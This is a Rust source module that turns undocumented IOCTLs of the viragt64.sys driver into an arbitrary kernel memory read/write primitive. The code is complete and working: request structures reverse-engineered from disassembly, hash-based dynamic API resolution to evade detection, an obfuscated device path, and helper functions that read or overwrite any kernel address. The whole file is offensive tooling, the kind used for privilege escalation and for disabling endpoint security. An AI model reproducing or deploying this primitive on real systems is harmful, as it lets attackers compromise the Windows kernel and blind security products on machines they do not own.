//! Kernel read/write primitive via viragt64.sys IOCTL interface
//!
//! Uses undocumented IOCTLs discovered via IDA reverse engineering:
//!   - IOCTL 0x82730028: Arbitrary kernel read (MDL-based, validated per byte)
//!   - IOCTL 0x8273007C: Arbitrary kernel write (2 QWORDs via InterlockedExchange64)
//!
//! All API calls (CreateFileW, DeviceIoControl, CloseHandle) resolved dynamically.

use crate::resolver::*;
use windows::Win32::Foundation::*;

const IOCTL_KERNEL_READ: u32 = 0x82730028;
const IOCTL_KERNEL_WRITE: u32 = 0x8273007C;

// Type aliases for dynamically resolved functions
type FnCreateFileW =
    unsafe extern "system" fn(*const u16, u32, u32, *const u8, u32, u32, HANDLE) -> HANDLE;
type FnDeviceIoControl = unsafe extern "system" fn(
    HANDLE,
    u32,
    *const u8,
    u32,
    *mut u8,
    u32,
    *mut u32,
    *const u8,
) -> BOOL;
type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> BOOL;

/// Input buffer for IOCTL_KERNEL_READ (0x82730028)
/// Verified from disassembly:
///   mov r13d, [rdi+18h]   ; length at offset 0x18
///   mov rcx, [rdi]        ; address at offset 0x00
#[repr(C)]
#[derive(Clone, Copy)]
struct ViragReadRequest {
    address: u64,   // +0x00: kernel address to read
    _pad: [u8; 16], // +0x08: padding (offsets 0x08..0x17 unused)
    length: u32,    // +0x18: number of bytes to read
    _pad2: [u8; 4], // +0x1C: alignment padding
}

/// Input buffer for IOCTL_KERNEL_WRITE (0x8273007C)
/// Verified from disassembly:
///   mov rbp, [rdi]        ; dest address at offset 0x00
///   mov rcx, [rdi+8]      ; value1 at offset 0x08
///   xchg rcx, [rbp+0]     ; InterlockedExchange64(*dest, value1)
///   mov rdx, [rdi+10h]    ; value2 at offset 0x10
///   xchg rdx, [rbp+8]     ; InterlockedExchange64(*(dest+8), value2)
#[repr(C)]
#[derive(Clone, Copy)]
struct ViragWriteRequest {
    dest_address: u64, // +0x00: destination kernel address
    value1: u64,       // +0x08: first QWORD to write at *dest
    value2: u64,       // +0x10: second QWORD to write at *(dest+8)
}

pub struct KernelRW {
    device: HANDLE,
    fn_ioctl: FnDeviceIoControl,
    fn_close: FnCloseHandle,
}

impl KernelRW {
    pub fn new(api: &ApiResolver) -> Result<Self, String> {
        let fn_create: FnCreateFileW = unsafe {
            std::mem::transmute(
                api.k32(HASH_CREATE_FILE_W)
                    .ok_or("Failed to resolve CreateFileW")?,
            )
        };
        let fn_ioctl: FnDeviceIoControl = unsafe {
            std::mem::transmute(
                api.k32(HASH_DEVICE_IO_CONTROL)
                    .ok_or("Failed to resolve DeviceIoControl")?,
            )
        };
        let fn_close: FnCloseHandle = unsafe {
            std::mem::transmute(
                api.k32(HASH_CLOSE_HANDLE)
                    .ok_or("Failed to resolve CloseHandle")?,
            )
        };

        // Build device path: "\\\\.\\viragtlt"
        let path: Vec<u16> = [
            '\\' as u16,
            '\\' as u16,
            '.' as u16,
            '\\' as u16,
            'v' as u16,
            'i' as u16,
            'r' as u16,
            'a' as u16,
            'g' as u16,
            't' as u16,
            'l' as u16,
            't' as u16,
            0u16,
        ]
        .to_vec();

        let device = unsafe {
            fn_create(
                path.as_ptr(),
                0xC0000000, // GENERIC_READ | GENERIC_WRITE
                0,          // FILE_SHARE_NONE
                std::ptr::null(),
                3,    // OPEN_EXISTING
                0x80, // FILE_ATTRIBUTE_NORMAL
                HANDLE::default(),
            )
        };

        if device.is_invalid() {
            return Err(format!("Failed to open viragt64 device: {}", unsafe {
                GetLastError().0
            }));
        }

        Ok(KernelRW {
            device,
            fn_ioctl,
            fn_close,
        })
    }

    /// Read arbitrary bytes from a kernel address using IOCTL 0x82730028
    fn raw_read(&self, address: u64, buf: &mut [u8]) -> Result<(), String> {
        let req = ViragReadRequest {
            address,
            _pad: [0u8; 16],
            length: buf.len() as u32,
            _pad2: [0u8; 4],
        };
        let mut ret = 0u32;
        let ok = unsafe {
            (self.fn_ioctl)(
                self.device,
                IOCTL_KERNEL_READ,
                &req as *const _ as *const u8,
                std::mem::size_of::<ViragReadRequest>() as u32,
                buf.as_mut_ptr(),
                buf.len() as u32,
                &mut ret,
                std::ptr::null(),
            )
        };
        if !ok.as_bool() {
            return Err(format!("IOCTL kernel read failed at 0x{:016X}", address));
        }
        Ok(())
    }

    /// Write 2 QWORDs to a kernel address using IOCTL 0x8273007C
    fn raw_write_2qword(&self, dest: u64, val1: u64, val2: u64) -> Result<(), String> {
        let req = ViragWriteRequest {
            dest_address: dest,
            value1: val1,
            value2: val2,
        };
        let mut ret = 0u32;
        let ok = unsafe {
            (self.fn_ioctl)(
                self.device,
                IOCTL_KERNEL_WRITE,
                &req as *const _ as *const u8,
                std::mem::size_of::<ViragWriteRequest>() as u32,
                std::ptr::null_mut(),
                0,
                &mut ret,
                std::ptr::null(),
            )
        };
        if !ok.as_bool() {
            return Err(format!("IOCTL kernel write failed at 0x{:016X}", dest));
        }
        Ok(())
    }

    pub fn read_u32(&self, address: u64) -> Result<u32, String> {
        let mut buf = [0u8; 4];
        self.raw_read(address, &mut buf)?;
        Ok(u32::from_le_bytes(buf))
    }

    pub fn read_u64(&self, address: u64) -> Result<u64, String> {
        let mut buf = [0u8; 8];
        self.raw_read(address, &mut buf)?;
        Ok(u64::from_le_bytes(buf))
    }

    pub fn read_u8(&self, address: u64) -> Result<u8, String> {
        let mut buf = [0u8; 1];
        self.raw_read(address, &mut buf)?;
        Ok(buf[0])
    }

    pub fn read_bytes(&self, address: u64, buf: &mut [u8]) -> Result<(), String> {
        self.raw_read(address, buf)
    }

    /// Write a single byte using read-modify-write.
    /// viragt64 can only write in QWORD granularity, so we:
    /// 1. Read the containing QWORD
    /// 2. Modify the target byte
    /// 3. Write both the modified QWORD and the next QWORD back
    pub fn write_u8(&self, address: u64, value: u8) -> Result<(), String> {
        // Align down to QWORD boundary
        let qword_addr = address & !7u64;
        let byte_offset = (address - qword_addr) as usize;

        // Read 16 bytes (2 QWORDs) starting at the aligned address
        let mut buf = [0u8; 16];
        self.raw_read(qword_addr, &mut buf)?;

        // Modify the target byte
        buf[byte_offset] = value;

        // Write both QWORDs back
        let val1 = u64::from_le_bytes(buf[0..8].try_into().unwrap());
        let val2 = u64::from_le_bytes(buf[8..16].try_into().unwrap());
        self.raw_write_2qword(qword_addr, val1, val2)
    }

    pub fn write_u32(&self, address: u64, value: u32) -> Result<(), String> {
        // Align down to QWORD boundary
        let qword_addr = address & !7u64;
        let byte_offset = (address - qword_addr) as usize;

        // Read 16 bytes (2 QWORDs)
        let mut buf = [0u8; 16];
        self.raw_read(qword_addr, &mut buf)?;

        // Modify the 4 bytes
        buf[byte_offset..byte_offset + 4].copy_from_slice(&value.to_le_bytes());

        // Write both QWORDs back
        let val1 = u64::from_le_bytes(buf[0..8].try_into().unwrap());
        let val2 = u64::from_le_bytes(buf[8..16].try_into().unwrap());
        self.raw_write_2qword(qword_addr, val1, val2)
    }
}

impl Drop for KernelRW {
    fn drop(&mut self) {
        unsafe {
            let _ = (self.fn_close)(self.device);
        }
    }
}
